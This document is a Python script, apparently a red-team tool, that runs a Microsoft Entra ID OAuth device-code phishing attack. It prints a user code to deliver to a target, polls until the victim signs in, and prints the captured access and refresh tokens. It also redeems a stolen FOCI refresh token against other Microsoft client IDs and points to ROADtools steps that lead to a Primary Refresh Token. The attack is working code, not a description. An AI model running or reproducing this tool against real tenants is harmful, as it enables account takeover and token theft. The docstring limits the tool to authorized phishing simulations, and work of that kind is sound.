#!/usr/bin/env python3
"""
entra_device_code_phish.py - Drive a Microsoft Entra ID OAuth device-code flow to obtain
tokens during an AUTHORIZED phishing engagement, then optionally redeem the FOCI refresh
token against another family client.

This is the technique used by Storm-2372: request the device code with the Microsoft
Authentication Broker client (29d9ed98-a469-4536-ade2-f981bc1d605e) so the resulting refresh
token can drive device registration -> Primary Refresh Token (use ROADtools/roadtx for the
device-join + PRT steps; this script handles the token-acquisition portion).

USAGE
  # Start a device-code flow against Microsoft Graph using the Auth Broker client:
  python3 entra_device_code_phish.py --resource https://graph.microsoft.com \
        --client-id 29d9ed98-a469-4536-ade2-f981bc1d605e

  # Redeem a captured FOCI refresh token against a different family client (e.g. Teams):
  python3 entra_device_code_phish.py --refresh-token "<RT>" \
        --client-id 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --resource https://graph.microsoft.com

OUTPUT
  Prints the user_code + verification_uri to deliver in the lure, then polls and prints the
  access_token / refresh_token / id_token on success.

DEPENDENCIES
  pip install requests

LEGAL / OPSEC
  Authorized red-team / phishing simulation only. The sign-in is recorded with
  authenticationProtocol=deviceCode on the legitimate Microsoft domain; the Auth Broker
  client ID and any subsequent device registration are high-signal IOCs.
"""
import argparse
import sys
import time

try:
    import requests
except ImportError:
    sys.exit("[!] pip install requests")

# A few public FOCI family client IDs (refresh token from one redeems for any other)
FOCI_CLIENTS = {
    "auth-broker": "29d9ed98-a469-4536-ade2-f981bc1d605e",   # Microsoft Authentication Broker
    "azure-cli": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    "teams": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "office": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "onedrive": "ab9b8c07-8f02-4f72-87fa-80105867a763",
}


def authority(tenant):
    return f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0"


def start_device_code(tenant, client_id, scope):
    r = requests.post(
        f"{authority(tenant)}/devicecode",
        data={"client_id": client_id, "scope": scope},
        timeout=15,
    )
    r.raise_for_status()
    return r.json()


def poll_token(tenant, client_id, device_code, interval, expires_in):
    url = f"{authority(tenant)}/token"
    deadline = time.time() + expires_in
    while time.time() < deadline:
        time.sleep(interval)
        r = requests.post(
            url,
            data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": client_id,
                "device_code": device_code,
            },
            timeout=15,
        )
        body = r.json()
        if r.status_code == 200:
            return body
        err = body.get("error")
        if err == "authorization_pending":
            print("[.] waiting for victim to authenticate ...")
            continue
        if err == "slow_down":
            interval += 5
            continue
        if err in ("expired_token", "authorization_declined", "bad_verification_code"):
            print(f"[!] flow ended: {err}")
            return None
        print(f"[!] error: {err} - {body.get('error_description', '')[:120]}")
        return None
    print("[!] device code expired before authentication.")
    return None


def refresh(tenant, client_id, refresh_token, scope):
    r = requests.post(
        f"{authority(tenant)}/token",
        data={
            "grant_type": "refresh_token",
            "client_id": client_id,
            "refresh_token": refresh_token,
            "scope": scope,
        },
        timeout=15,
    )
    return r.status_code, r.json()


def show_tokens(tok):
    for k in ("access_token", "refresh_token", "id_token"):
        if tok.get(k):
            print(f"\n=== {k} ===\n{tok[k]}")
    if tok.get("foci"):
        print("\n[+] foci=1  -> refresh_token is a Family-of-Client-IDs token (redeemable for "
              "any family client).")


def main():
    p = argparse.ArgumentParser(description="Entra device-code phishing / FOCI helper")
    p.add_argument("--tenant", default="common", help="tenant id or 'common'/'organizations'")
    p.add_argument("--client-id", default=FOCI_CLIENTS["auth-broker"],
                   help="app client id (default: Microsoft Authentication Broker)")
    p.add_argument("--resource", default="https://graph.microsoft.com",
                   help="resource for the .default scope")
    p.add_argument("--refresh-token", help="redeem this FOCI refresh token instead of phishing")
    a = p.parse_args()

    scope = f"{a.resource}/.default offline_access openid profile"

    if a.refresh_token:
        sc, tok = refresh(a.tenant, a.client_id, a.refresh_token, scope)
        if sc != 200:
            sys.exit(f"[!] refresh failed: {tok.get('error_description', tok)}")
        print(f"[+] Redeemed refresh token against client {a.client_id}")
        show_tokens(tok)
        return

    dc = start_device_code(a.tenant, a.client_id, scope)
    print("\n========================= DELIVER TO TARGET =========================")
    print(dc.get("message", ""))
    print(f"  verification_uri : {dc.get('verification_uri')}")
    print(f"  user_code        : {dc.get('user_code')}")
    print("=====================================================================\n")
    print(f"[*] client_id={a.client_id}  resource={a.resource}")

    tok = poll_token(a.tenant, a.client_id, dc["device_code"],
                     int(dc.get("interval", 5)), int(dc.get("expires_in", 900)))
    if not tok:
        sys.exit(1)
    print("\n[+] Tokens captured.")
    show_tokens(tok)
    if a.client_id == FOCI_CLIENTS["auth-broker"]:
        print("\n[*] Next (ROADtools): roadtx device -a register ; roadtx prt -r <refresh_token>")


if __name__ == "__main__":
    main()
